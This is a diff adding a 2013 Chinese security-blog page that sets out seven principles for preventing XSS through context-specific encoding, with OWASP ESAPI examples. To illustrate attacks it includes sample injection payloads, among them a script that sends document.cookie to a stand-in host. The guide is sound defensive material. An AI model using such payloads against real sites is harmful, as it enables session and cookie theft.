@@ -1,0 +1,950 @@
+<!DOCTYPE html>
+<html lang="zh-cn" itemscope itemtype="http://schema.org/WebPage">
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <title>防御XSS的七条原则 - Nuclear&#39;Atk（核攻击）网络安全实验室</title>
+  
+
+<meta name="renderer" content="webkit" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+<meta name="MobileOptimized" content="width"/>
+<meta name="HandheldFriendly" content="true"/>
+
+
+<meta name="applicable-device" content="pc,mobile">
+
+<meta name="theme-color" content="#f8f5ec" />
+<meta name="msapplication-navbutton-color" content="#f8f5ec">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="#f8f5ec">
+
+<meta name="mobile-web-app-capable" content="yes">
+
+<meta name="author" content="shineforyou" /><meta name="description" content="防御XSS的七条原则。本文将会着重介绍防御XSS攻击的一些原则，需要读者对于XSS有所了解，至少知道XSS漏洞的基本原理，如果您对此不是特别清楚，请参考这两篇文章：《Stored and Reflected XSS Attack》《DOM Based XSS》。攻击者可以利用XSS漏洞向用户发送攻击脚本，而用户的浏览器因为没有办法知道这段脚本是不可信的，所以依然会执行它。对于浏览器而言，它认为这段脚本是来自可以信任的服务器的，所以脚本可以光明正大地访问Cookie，或者保存在浏览器里被当前网站所用的敏感信息，甚至可以知道用户电脑安装了哪些软件。这些脚本还可以改写HTML页面，进行钓鱼攻击。虽然产生XSS漏洞的原因各种各样，对于漏洞的利用也是花样百出，但是如果我们遵循本文提到防御原则，我们依然可以做到防止XSS攻击的发生。" />
+<meta name="keywords" content="防御XSS的七条原则" />
+
+
+
+<meta name="baidu-site-verification" content="GSIJv096Bu" />
+
+
+
+<meta name="generator" content="Hugo 0.82.0" />
+
+
+<link rel="canonical" href="https://lcx.cc/post/3610/" />
+
+
+
+
+
+<link rel="icon" href="/favicon.ico" />
+
+
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/sass/jane.min.af20b78e95c84de86b00a0242a4a77bd2601700e1b250edf27537d957ac0041d.css" integrity="sha256-ryC3jpXITehrAKAkKkp3vSYBcA4bJQ7fJ1N9lXrABB0=" media="screen" crossorigin="anonymous">
+
+
+
+
+
+<meta property="og:title" content="防御XSS的七条原则" />
+<meta property="og:description" content="防御XSS的七条原则。本文将会着重介绍防御XSS攻击的一些原则，需要读者对于XSS有所了解，至少知道XSS漏洞的基本原理，如果您对此不是特别清楚，请参考这两篇文章：《Stored and Reflected XSS Attack》《DOM Based XSS》。攻击者可以利用XSS漏洞向用户发送攻击脚本，而用户的浏览器因为没有办法知道这段脚本是不可信的，所以依然会执行它。对于浏览器而言，它认为这段脚本是来自可以信任的服务器的，所以脚本可以光明正大地访问Cookie，或者保存在浏览器里被当前网站所用的敏感信息，甚至可以知道用户电脑安装了哪些软件。这些脚本还可以改写HTML页面，进行钓鱼攻击。虽然产生XSS漏洞的原因各种各样，对于漏洞的利用也是花样百出，但是如果我们遵循本文提到防御原则，我们依然可以做到防止XSS攻击的发生。" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://lcx.cc/post/3610/" /><meta property="article:section" content="post" />
+<meta property="article:published_time" content="2013-06-20T18:00:21&#43;08:00" />
+<meta property="article:modified_time" content="2013-06-20T18:41:05&#43;08:00" />
+
+<meta itemprop="name" content="防御XSS的七条原则">
+<meta itemprop="description" content="防御XSS的七条原则。本文将会着重介绍防御XSS攻击的一些原则，需要读者对于XSS有所了解，至少知道XSS漏洞的基本原理，如果您对此不是特别清楚，请参考这两篇文章：《Stored and Reflected XSS Attack》《DOM Based XSS》。攻击者可以利用XSS漏洞向用户发送攻击脚本，而用户的浏览器因为没有办法知道这段脚本是不可信的，所以依然会执行它。对于浏览器而言，它认为这段脚本是来自可以信任的服务器的，所以脚本可以光明正大地访问Cookie，或者保存在浏览器里被当前网站所用的敏感信息，甚至可以知道用户电脑安装了哪些软件。这些脚本还可以改写HTML页面，进行钓鱼攻击。虽然产生XSS漏洞的原因各种各样，对于漏洞的利用也是花样百出，但是如果我们遵循本文提到防御原则，我们依然可以做到防止XSS攻击的发生。"><meta itemprop="datePublished" content="2013-06-20T18:00:21&#43;08:00" />
+<meta itemprop="dateModified" content="2013-06-20T18:41:05&#43;08:00" />
+<meta itemprop="wordCount" content="7329">
+<meta itemprop="keywords" content="XSS,API,Ascii,cookie,CSS,Html,HTTP,IE,IP,Java,SEO,URL,Web,安全,编码,代码,服务,服务器,攻击,函数,脚本,浏览器,漏洞,事件,数据,协议," /><meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="防御XSS的七条原则"/>
+<meta name="twitter:description" content="防御XSS的七条原则。本文将会着重介绍防御XSS攻击的一些原则，需要读者对于XSS有所了解，至少知道XSS漏洞的基本原理，如果您对此不是特别清楚，请参考这两篇文章：《Stored and Reflected XSS Attack》《DOM Based XSS》。攻击者可以利用XSS漏洞向用户发送攻击脚本，而用户的浏览器因为没有办法知道这段脚本是不可信的，所以依然会执行它。对于浏览器而言，它认为这段脚本是来自可以信任的服务器的，所以脚本可以光明正大地访问Cookie，或者保存在浏览器里被当前网站所用的敏感信息，甚至可以知道用户电脑安装了哪些软件。这些脚本还可以改写HTML页面，进行钓鱼攻击。虽然产生XSS漏洞的原因各种各样，对于漏洞的利用也是花样百出，但是如果我们遵循本文提到防御原则，我们依然可以做到防止XSS攻击的发生。"/>
+
+<!--[if lte IE 9]>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/classlist/1.1.20170427/classList.min.js"></script>
+<![endif]-->
+
+<!--[if lt IE 9]>
+  <script src="https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js"></script>
+<![endif]-->
+
+
+
+
+</head>
+<body>
+  <div id="mobile-navbar" class="mobile-navbar">
+  <div class="mobile-header-logo">
+    <a href="/" class="logo">Nuclear'Atk</a>
+  </div>
+  <div class="mobile-navbar-icon">
+    <span></span>
+    <span></span>
+    <span></span>
+  </div>
+</div>
+<nav id="mobile-menu" class="mobile-menu slideout-menu">
+  <ul class="mobile-menu-list">
+    <li class="mobile-menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/">主页</a>
+          
+        
+      </li><li class="mobile-menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/post/">归档</a>
+          
+        
+      </li><li class="mobile-menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/tags/">标签</a>
+          
+        
+      </li><li class="mobile-menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/categories/">分类</a>
+          
+        
+      </li><li class="mobile-menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/%E5%8F%8B%E6%83%85%E9%93%BE%E6%8E%A5/">友链</a>
+          
+        
+      </li><li class="mobile-menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/%E5%85%B3%E4%BA%8E/">关于</a>
+          
+        
+      </li>
+    
+
+    
+  </ul>
+</nav>
+
+
+  
+    
+
+
+
+
+
+
+  <link rel="stylesheet" href="/lib/photoswipe/photoswipe.min.css" />
+  <link rel="stylesheet" href="/lib/photoswipe/default-skin/default-skin.min.css" />
+
+
+
+
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+<div class="pswp__bg"></div>
+
+<div class="pswp__scroll-wrap">
+    
+    <div class="pswp__container">
+      <div class="pswp__item"></div>
+      <div class="pswp__item"></div>
+      <div class="pswp__item"></div>
+    </div>
+    
+    <div class="pswp__ui pswp__ui--hidden">
+    <div class="pswp__top-bar">
+      
+      <div class="pswp__counter"></div>
+      <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+      <button class="pswp__button pswp__button--share" title="Share"></button>
+      <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+      <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+      
+      
+      <div class="pswp__preloader">
+        <div class="pswp__preloader__icn">
+          <div class="pswp__preloader__cut">
+            <div class="pswp__preloader__donut"></div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+      <div class="pswp__share-tooltip"></div>
+    </div>
+    <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+    </button>
+    <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+    </button>
+    <div class="pswp__caption">
+      <div class="pswp__caption__center"></div>
+    </div>
+    </div>
+    </div>
+</div>
+
+  
+
+  
+
+  
+
+  <header id="header" class="header container">
+    <div class="logo-wrapper">
+  <a href="/" class="logo">
+    
+      Nuclear'Atk
+    
+  </a>
+</div>
+
+<nav class="site-navbar">
+  <ul id="menu" class="menu">
+    
+    
+        <li class="menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/">主页</a>
+          
+
+        
+
+      </li>
+    
+        <li class="menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/post/">归档</a>
+          
+
+        
+
+      </li>
+    
+        <li class="menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/tags/">标签</a>
+          
+
+        
+
+      </li>
+    
+        <li class="menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/categories/">分类</a>
+          
+
+        
+
+      </li>
+    
+        <li class="menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/%E5%8F%8B%E6%83%85%E9%93%BE%E6%8E%A5/">友链</a>
+          
+
+        
+
+      </li>
+    
+        <li class="menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/%E5%85%B3%E4%BA%8E/">关于</a>
+          
+
+        
+
+      </li>
+    
+
+    
+    
+
+    
+  </ul>
+</nav>
+
+  </header>
+
+  <div id="mobile-panel">
+    <main id="main" class="main bg-llight">
+      <div class="content-wrapper">
+        <div id="content" class="content container">
+          <article class="post bg-white">
+    
+    <header class="post-header">
+      <h1 class="post-title">防御XSS的七条原则</h1>
+      
+      <div class="post-meta">
+        <time datetime="2013-06-20" class="post-time">
+          2013-06-20
+        </time>
+        <div class="post-category">
+            <a href="https://lcx.cc/categories/%E8%80%81%E7%B3%BB%E7%BB%9F%E5%86%85%E5%AE%B9/"> 老系统内容 </a>
+            <a href="https://lcx.cc/categories/xss/"> XSS </a>
+            
+          </div>
+        <span class="more-meta"> 约 7329 字 </span>
+          <span class="more-meta"> 预计阅读 15 分钟 </span>
+
+        
+        
+
+        
+        
+      </div>
+    </header>
+
+    
+    
+<div class="post-toc" id="post-toc">
+  <h2 class="post-toc-title">文章目录</h2>
+  <div class="post-toc-content">
+    
+  </div>
+</div>
+
+    
+    <div class="post-content">
+      
+<p style="text-indent:2em;">
+	<strong><span style="color:#333333;">前言</span></strong> 
+</p>
+<p style="text-indent:2em;">
+	本文将会着重介绍防御XSS攻击的一些原则，需要读者对于XSS有所了解，至少知道XSS漏洞的基本原理，如果您对此不是特别清楚，请参考这两篇文章：《<a href="https://www.owasp.org/index.php/XSS#Stored_and_Reflected_XSS_Attacks" target="_blank">Stored and Reflected XSS Attack</a>》《<a href="https://www.owasp.org/index.php/DOM_Based_XSS" target="_blank">DOM Based XSS</a>》
+</p>
+<p style="text-indent:2em;">
+	攻击者可以利用XSS漏洞向用户发送攻击脚本，而用户的浏览器因为没有办法知道这段脚本是不可信的，所以依然会执行它。对于浏览器而言，它认为这段脚本是来自可以信任的服务器的，所以脚本可以光明正大地访问Cookie，或者保存在浏览器里被当前网站所用的敏感信息，甚至可以知道用户电脑安装了哪些软件。这些脚本还可以改写HTML页面，进行钓鱼攻击。
+</p>
+<p style="text-indent:2em;">
+	虽然产生XSS漏洞的原因各种各样，对于漏洞的利用也是花样百出，但是如果我们遵循本文提到防御原则，我们依然可以做到防止XSS攻击的发生。
+</p>
+<p style="text-indent:2em;">
+	有人可能会问，防御XSS的核心不就是在输出不可信数据的时候进行编码，而现如今流行的Web框架（比如Rails）大多都在默认情况下就对不可信数据进行了HTML编码，帮我们做了防御，还用得着我们自己再花时间研究如何防御XSS吗？答案是肯定的，对于将要放置到HTML页面body里的不可信数据，进行HTML编码已经足够防御XSS攻击了，甚至将HTML编码后的数据放到HTML标签（TAG）的属性（attribute）里也不会产生XSS漏洞（但前提是这些属性都正确使用了引号），但是，如果你将HTML编码后的数据放到了&lt;SCRIPT&gt;标签里的任何地方，甚至是HTML标签的事件处理属性里（如onmouseover），又或者是放到了CSS、URL里，XSS攻击依然会发生，在这种情况下，HTML编码不起作用了。所以就算你到处使用了HTML编码，XSS漏洞依然可能存在。下面这几条规则就将告诉你，如何在<strong><span style="color:#333333;">正确的地方使用正确的编码</span></strong>来消除XSS漏洞。
+</p>
+<p style="text-indent:2em;">
+	<strong><span style="color:#333333;">原则1：不要在页面中插入任何不可信数据，除非这些数已经据根据下面几个原则进行了编码</span></strong> 
+</p>
+<p style="text-indent:2em;">
+	第一条原则其实是“Secure By Default”原则：不要往HTML页面中插入任何不可信数据，除非这些数据已经根据下面几条原则进行了编码。
+</p>
+<p style="text-indent:2em;">
+	之所以有这样一条原则存在，是因为HTML里有太多的地方容易形成XSS漏洞，而且形成漏洞的原因又有差别，比如有些漏洞发生在HTML标签里，有些发生在HTML标签的属性里，还有的发生在页面的&lt;Script&gt;里，甚至有些还出现在CSS里，再加上不同的浏览器对页面的解析或多或少有些不同，使得有些漏洞只在特定浏览器里才会产生。如果想要通过XSS过滤器（XSS Filter）对不可信数据进行转义或替换，那么XSS过滤器的过滤规则将会变得异常复杂，难以维护而且会有被绕过的风险。
+</p>
+<p style="text-indent:2em;">
+	所以实在想不出有什么理由要直接往HTML页面里插入不可信数据，就算是有XSS过滤器帮你做过滤，产生XSS漏洞的风险还是很高
+</p>
+<pre class="prettyprint lang-html">&lt;script&gt;…不要在这里直接插入不可信数据…&lt;/script&gt;直接插入到SCRIPT标签里
+&lt;!– …不要在这里直接插入不可信数据… –&gt;
+插入到HTML注释里
+
+&lt;div 不要在这里直接插入不可信数据=”…”&gt;&lt;/div&gt;
+插入到HTML标签的属性名里
+
+&lt;div name=”…不要在这里直接插入不可信数据…”&gt;&lt;/div&gt;
+插入到HTML标签的属性值里
+
+&lt;不要在这里直接插入不可信数据 href=”…”&gt;&lt;/a&gt;
+作为HTML标签的名字
+
+&lt;style&gt;…不要在这里直接插入不可信数据…&lt;/style&gt;
+直接插入到CSS里</pre>
+<p style="padding:0px;border:0px currentColor;line-height:24px;margin-top:0px;margin-bottom:1.71rem;vertical-align:baseline;white-space:normal;">
+	最重要的是，千万不要引入任何不可信的第三方JavaScript到页面里，一旦引入了，这些脚本就能够操纵你的HTML页面，窃取敏感信息或者发起钓鱼攻击等等。
+</p>
+<p style="text-indent:2em;">
+	<strong><span style="color:#333333;">原则2：在将不可信数据插入到HTML标签之间时，对这些数据进行HTML Entity编码</span></strong> 
+</p>
+<p style="text-indent:2em;">
+	在这里相当强调是往HTML标签之间插入不可信数据，以区别于往HTML标签属性部分插入不可信数据，因为这两者需要进行不同类型的编码。当你确实需要往HTML标签之间插入不可信数据的时候，首先要做的就是对不可信数据进行HTML Entity编码。比如，我们经常需要往DIV，P，TD这些标签里放入一些用户提交的数据，这些数据是不可信的，需要对它们进行HTML Entity编码。很多Web框架都提供了HTML Entity编码的函数，我们只需要调用这些函数就好，而有些Web框架似乎更“智能”，比如Rails，它能在默认情况下对所有插入到HTML页面的数据进行HTML&nbsp;Entity编码，尽管不能完全防御XSS，但着实减轻了开发人员的负担。
+</p>
+<pre class="prettyprint lang-html">&lt;body&gt;…插入不可信数据前，对其进行HTML Entity编码…&lt;/body&gt;&lt;div&gt;…插入不可信数据前，对其进行HTML Entity编码…&lt;/div&gt;&lt;p&gt;…插入不可信数据前，对其进行HTML Entity编码…&lt;/p&gt;
+以此类推，往其他HTML标签之间插入不可信数据前，对其进行HTML Entity编码</pre>
+<p style="text-indent:2em;">
+	<span style="color:#333333;white-space:nowrap;"><strong>[编码规则]</strong></span> 
+</p>
+<p style="text-indent:2em;">
+	<span style="white-space:nowrap;">那么HTML Entity编码具体应该做哪些事情呢？它需要对下面这6个特殊字符进行编码：</span> 
+</p>
+<pre class="prettyprint lang-html">&amp;     –&gt;     &amp;amp;
+&lt;     –&gt;     &amp;lt;
+&gt;     –&gt;     &amp;gt;
+”     –&gt;     &amp;quot;
+‘     –&gt;     &amp;#x27;
+/     –&gt;     &amp;#x2f;</pre>
+<p style="padding:0px;border:0px currentColor;line-height:24px;margin-top:0px;margin-bottom:1.71rem;vertical-align:baseline;white-space:normal;">
+	有两点需要特别说明的是:
+</p>
+<ul style="margin:0px 0px 1.71rem;padding:0px;border:0px currentColor;line-height:24px;vertical-align:baseline;list-style-position:outside;white-space:normal;">
+	<li style="margin:0px 0px 0px 2.57rem;padding:0px;border:0px currentColor;vertical-align:baseline;">
+		不推荐将单引号( ‘ )编码为 &amp;apos; 因为它并不是标准的HTML标签
+	</li>
+	<li style="margin:0px 0px 0px 2.57rem;padding:0px;border:0px currentColor;vertical-align:baseline;">
+		需要对斜杠号( / )编码，因为在进行XSS攻击时，斜杠号对于关闭当前HTML标签非常有用
+	</li>
+</ul>
+<p style="padding:0px;border:0px currentColor;line-height:24px;margin-top:0px;margin-bottom:1.71rem;vertical-align:baseline;white-space:normal;">
+	推荐使用OWASP提供的<a style="margin:0px;padding:0px;border:0px currentColor;vertical-align:baseline;" href="https://www.owasp.org/index.php/ESAPI" target="_blank">ESAPI</a>函数库，它提供了一系列非常严格的用于进行各种安全编码的函数。在当前这个例子里，你可以使用:
+</p>
+<pre class="prettyprint lang-html">String encodedContent = ESAPI.encoder().encodeForHTML(request.getParameter(“input”));</pre>
+<p style="text-indent:2em;">
+	<span style="color:#333333;white-space:nowrap;"><strong>原则3：在将不可信数据插入到HTML属性里时，对这些数据进行HTML属性编码</strong></span><span style="white-space:nowrap;"></span> 
+</p>
+<p style="text-indent:2em;">
+	这条原则是指，当你要往HTML属性（例如width、name、value属性）的值部分(data value)插入不可信数据的时候，应该对数据进行HTML属性编码。不过需要注意的是，当要往HTML标签的事件处理属性（例如onmouseover）里插入数据的时候，本条原则不适用，应该用下面介绍的原则4对其进行JavaScript编码。
+</p>
+<pre class="prettyprint lang-html">&lt;div attr=…插入不可信数据前，进行HTML属性编码…&gt;&lt;/div&gt;属性值部分没有使用引号，不推荐
+&lt;div attr=’…插入不可信数据前，进行HTML属性编码…’&gt;&lt;/div&gt;
+属性值部分使用了单引号
+&lt;div attr=”…插入不可信数据前，进行HTML属性编码…”&gt;&lt;/div&gt;
+属性值部分使用了双引号</pre>
+<p style="text-indent:2em;">
+	<strong><span style="color:#333333;">[编码规则]</span></strong> 
+</p>
+<p style="text-indent:2em;">
+	除了阿拉伯数字和字母，对其他所有的字符进行编码，只要该字符的ASCII码小于256。编码后输出的格式为 &amp;#xHH; （以&amp;#x开头，HH则是指该字符对应的十六进制数字，分号作为结束符）
+</p>
+<p style="text-indent:2em;">
+	之所以编码规则如此严格，是因为开发者有时会忘记给属性的值部分加上引号。如果属性值部分没有使用引号的话，攻击者很容易就能闭合掉当前属性，随后即可插入攻击脚本。例如，如果属性没有使用引号，又没有对数据进行严格编码，那么一个空格符就可以闭合掉当前属性。请看下面这个攻击：
+</p>
+<p style="text-indent:2em;">
+	假设HTML代码是这样的：
+</p>
+<p style="text-indent:2em;">
+	&lt;div width=$INPUT&gt; …content… &lt;/div&gt;
+</p>
+<p style="text-indent:2em;">
+	攻击者可以构造这样的输入：
+</p>
+<p style="text-indent:2em;">
+	x onmouseover=”javascript:alert(/xss/)”
+</p>
+<p style="text-indent:2em;">
+	最后，在用户的浏览器里的最终HTML代码会变成这个样子：
+</p>
+<p style="text-indent:2em;">
+	&lt;div width=x onmouseover=”javascript:alert(/xss/)”&gt; …content… &lt;/div&gt;
+</p>
+<p style="text-indent:2em;">
+	只要用户的鼠标移动到这个DIV上，就会触发攻击者写好的攻击脚本。在这个例子里，脚本仅仅弹出一个警告框，除了恶作剧一下也没有太多的危害，但是在真实的攻击中，攻击者会使用更加具有破坏力的脚本，例如下面这个窃取用户cookie的XSS攻击：
+</p>
+<p style="text-indent:2em;">
+	x /&gt; &lt;script&gt;var img = document.createElement(“img”);img.src = ”http://hack.com/xss.js?” + escape(document.cookie);document.body.appendChild(img);&lt;/script&gt; &lt;div
+</p>
+<p style="text-indent:2em;">
+	除了空格符可以闭合当前属性外，这些符号也可以：
+</p>
+<p style="text-indent:2em;">
+	% &nbsp; &nbsp; * &nbsp; &nbsp; + &nbsp; &nbsp; , &nbsp; &nbsp; – &nbsp; &nbsp; / &nbsp; &nbsp; ; &nbsp; &nbsp; &lt; &nbsp; &nbsp; = &nbsp; &nbsp; &gt; &nbsp; &nbsp; ^ &nbsp; &nbsp; | &nbsp; &nbsp; `(反单引号，IE会认为它是单引号)
+</p>
+<p style="text-indent:2em;">
+	可以使用ESAPI提供的函数进行HTML属性编码：
+</p>
+<pre class="prettyprint lang-html">String encodedContent = ESAPI.encoder().encodeForHTMLAttribute(request.getParameter(“input”));</pre>
+<p style="text-indent:2em;">
+	<span style="color:#333333;white-space:nowrap;"><strong>原则4：在将不可信数据插入到SCRIPT里时，对这些数据进行SCRIPT编码</strong></span> 
+</p>
+<p style="text-indent:2em;">
+	这条原则主要针对动态生成的JavaScript代码，这包括脚本部分以及HTML标签的事件处理属性（Event Handler，如onmouseover, onload等）。在往JavaScript代码里插入数据的时候，只有一种情况是安全的，那就是对不可信数据进行JavaScript编码，并且只把这些数据放到使用引号包围起来的值部分（data value）之中，例如：
+</p>
+<p style="text-indent:2em;">
+	<span style="white-space:nowrap;">&lt;script&gt;</span> 
+</p>
+<p style="text-indent:2em;">
+	<span style="white-space:nowrap;">var message = “&lt;%= encodeJavaScript(@INPUT) %&gt;”;</span> 
+</p>
+<p style="text-indent:2em;">
+	<span style="white-space:nowrap;">&lt;/script&gt;</span> 
+</p>
+<p style="text-indent:2em;">
+	<span style="white-space:nowrap;">除此之外，往JavaScript代码里其他任何地方插入不可信数据都是相当危险的，攻击者可以很容易地插入攻击代码。</span> 
+</p>
+<pre class="prettyprint lang-html">&lt;script&gt;alert(‘…插入不可信数据前，进行JavaScript编码…’)&lt;/script&gt;值部分使用了单引号
+&lt;script&gt;x = “…插入不可信数据前，进行JavaScript编码…”&lt;/script&gt;
+值部分使用了双引号
+&lt;div onmouseover=”x=’…插入不可信数据前，进行JavaScript编码…’ “&lt;/div&gt;
+值部分使用了引号，且事件处理属性的值部分也使用了引号
+特别需要注意的是，在XSS防御中，有些JavaScript函数是极度危险的，就算对不可信数据进行JavaScript编码，也依然会产生XSS漏洞，例如：
+&lt;script&gt;
+window.setInterval(‘…就算对不可信数据进行了JavaScript编码，这里依然会有XSS漏洞…’);
+&lt;/script&gt;</pre>
+<p style="text-indent:2em;">
+	<span style="color:#333333;white-space:nowrap;"><strong>[编码规则]</strong></span> 
+</p>
+<p style="text-indent:2em;">
+	除了阿拉伯数字和字母，对其他所有的字符进行编码，只要该字符的ASCII码小于256。编码后输出的格式为 \xHH （以 \x 开头，HH则是指该字符对应的十六进制数字）
+</p>
+<p style="text-indent:2em;">
+	在对不可信数据做编码的时候，千万不能图方便使用反斜杠（ \ ）对特殊字符进行简单转义，比如将双引号 ” 转义成 \” ，这样做是不可靠的，因为浏览器在对页面做解析的时候，会先进行HTML解析，然后才是JavaScript解析，所以双引号很可能会被当做HTML字符进行HTML解析，这时双引号就可以突破代码的值部分，使得攻击者可以继续进行XSS攻击。例如：
+</p>
+<p style="text-indent:2em;">
+	假设代码片段如下：
+</p>
+<pre class="prettyprint lang-js">&lt;script&gt;
+var message = ” $VAR “;
+&lt;/script&gt;</pre>
+<p style="text-indent:2em;">
+	攻击者输入的内容为：
+</p>
+<pre class="prettyprint lang-html">\”; alert(‘xss’);//</pre>
+<p style="text-indent:2em;">
+	如果只是对双引号进行简单转义，将其替换成 \” 的话，攻击者输入的内容在最终的页面上会变成：
+</p>
+<pre class="prettyprint lang-js">&lt;script&gt;
+var message = ” \\”; alert(‘xss’);// “;
+&lt;/script&gt;</pre>
+<p style="text-indent:2em;">
+	浏览器在解析的时候，会认为反斜杠后面的那个双引号和第一个双引号相匹配，继而认为后续的alert(‘xss’)是正常的JavaScript脚本，因此允许执行。
+</p>
+<p style="text-indent:2em;">
+	可以使用ESAPI提供的函数进行JavaScript编码：
+</p>
+<pre class="prettyprint lang-html">String encodedContent = ESAPI.encoder().encodeForJavaScript(request.getParameter(“input”));</pre>
+<p style="text-indent:2em;">
+	<strong><span style="color:#333333;">原则5：在将不可信数据插入到Style属性里时，对这些数据进行CSS编码</span></strong> 
+</p>
+<p style="text-indent:2em;">
+	当需要往Stylesheet，Style标签或者Style属性里插入不可信数据的时候，需要对这些数据进行CSS编码。传统印象里CSS不过是负责页面样式的，但是实际上它比我们想象的要强大许多，而且还可以用来进行各种攻击。因此，不要对CSS里存放不可信数据掉以轻心，应该只允许把不可信数据放入到CSS属性的值部分，并进行适当的编码。除此以外，最好不要把不可信数据放到一些复杂属性里，比如url, behavior等，只能被IE认识的Expression属性允许执行JavaScript脚本，因此也不推荐把不可信数据放到这里。
+</p>
+<pre class="prettyprint lang-html">&lt;style&gt;selector { property : …插入不可信数据前，进行CSS编码…} &lt;/style&gt;&lt;style&gt;selector { property : ” …插入不可信数据前，进行CSS编码… “} &lt;/style&gt;
+&lt;span style=” property : …插入不可信数据前，进行CSS编码… ”&gt; … &lt;/span&gt;</pre>
+<p style="text-indent:2em;">
+	<strong><span style="color:#333333;">[编码规则]</span></strong> 
+</p>
+<p style="text-indent:2em;">
+	除了阿拉伯数字和字母，对其他所有的字符进行编码，只要该字符的ASCII码小于256。编码后输出的格式为 \HH （以 \ 开头，HH则是指该字符对应的十六进制数字）
+</p>
+<p style="text-indent:2em;">
+	同原则2，原则3，在对不可信数据进行编码的时候，切忌投机取巧对双引号等特殊字符进行简单转义，攻击者可以想办法绕开这类限制。
+</p>
+<p style="text-indent:2em;">
+	可以使用ESAPI提供的函数进行CSS编码：
+</p>
+<pre class="prettyprint lang-html">String encodedContent = ESAPI.encoder().encodeForCSS(request.getParameter(“input”));</pre>
+<p style="text-indent:2em;">
+	<strong><span style="color:#333333;">原则6：在将不可信数据插入到HTML URL里时，对这些数据进行URL编码</span></strong> 
+</p>
+<p style="text-indent:2em;">
+	当需要往HTML页面中的URL里插入不可信数据的时候，需要对其进行URL编码，如下：
+</p>
+<pre class="prettyprint lang-html">&lt;a href=”http://www.abcd.com?param=…插入不可信数据前，进行URL编码…”&gt; Link Content &lt;/a&gt;</pre>
+<p style="text-indent:2em;">
+	<strong><span style="color:#333333;">[编码规则]</span></strong> 
+</p>
+<p style="text-indent:2em;">
+	除了阿拉伯数字和字母，对其他所有的字符进行编码，只要该字符的ASCII码小于256。编码后输出的格式为 %HH （以 % 开头，HH则是指该字符对应的十六进制数字）
+</p>
+<p style="text-indent:2em;">
+	在对URL进行编码的时候，有两点是需要特别注意的：
+</p>
+<p style="text-indent:2em;">
+	1) URL属性应该使用引号将值部分包围起来，否则攻击者可以很容易突破当前属性区域，插入后续攻击代码
+</p>
+<p style="text-indent:2em;">
+	2) 不要对整个URL进行编码，因为不可信数据可能会被插入到href, src或者其他以URL为基础的属性里，这时需要对数据的起始部分的协议字段进行验证，否则攻击者可以改变URL的协议，例如从HTTP协议改为DATA伪协议，或者javascript伪协议。
+</p>
+<p style="text-indent:2em;">
+	可以使用ESAPI提供的函数进行URL编码：
+</p>
+<pre class="prettyprint lang-html">String encodedContent = ESAPI.encoder().encodeForURL(request.getParameter(“input”));</pre>
+<p style="text-indent:2em;">
+	ESAPI还提供了一些用于检测不可信数据的函数，在这里我们可以使用其来检测不可信数据是否真的是一个URL：
+</p>
+<pre class="prettyprint lang-java">String userProvidedURL = request.getParameter(“userProvidedURL”);boolean isValidURL = ESAPI.validator().isValidInput(“URLContext”, userProvidedURL, “URL”, 255, false);
+if (isValidURL) {
+&lt;a href=”&lt;%= encoder.encodeForHTMLAttribute(userProvidedURL) %&gt;”&gt;&lt;/a&gt;
+}</pre>
+<p style="text-indent:2em;">
+	<strong><span style="color:#333333;">原则7：使用富文本时，使用XSS规则引擎进行编码过滤</span></strong> 
+</p>
+<p style="text-indent:2em;">
+	Web应用一般都会提供用户输入富文本信息的功能，比如BBS发帖，写博客文章等，用户提交的富文本信息里往往包含了HTML标签，甚至是JavaScript脚本，如果不对其进行适当的编码过滤的话，则会形成XSS漏洞。但我们又不能因为害怕产生XSS漏洞，所以就不允许用户输入富文本，这样对用户体验伤害很大。
+</p>
+<p style="text-indent:2em;">
+	针对富文本的特殊性，我们可以使用XSS规则引擎对用户输入进行编码过滤，只允许用户输入安全的HTML标签，如&lt;b&gt;, &lt;i&gt;, &lt;p&gt;等，对其他数据进行HTML编码。需要注意的是，经过规则引擎编码过滤后的内容只能放在&lt;div&gt;, &lt;p&gt;等安全的HTML标签里，不要放到HTML标签的属性值里，更不要放到HTML事件处理属性里，或者放到&lt;SCRIPT&gt;标签里。
+</p>
+<p style="text-indent:2em;">
+	推荐XSS规则过滤引擎：<strong>OWASP AntiSamp</strong>或者<strong>Java HTML Sanitizer</strong> 
+</p>
+<p style="text-indent:2em;">
+	<strong><span style="color:#333333;">总结</span></strong> 
+</p>
+<p style="text-indent:2em;">
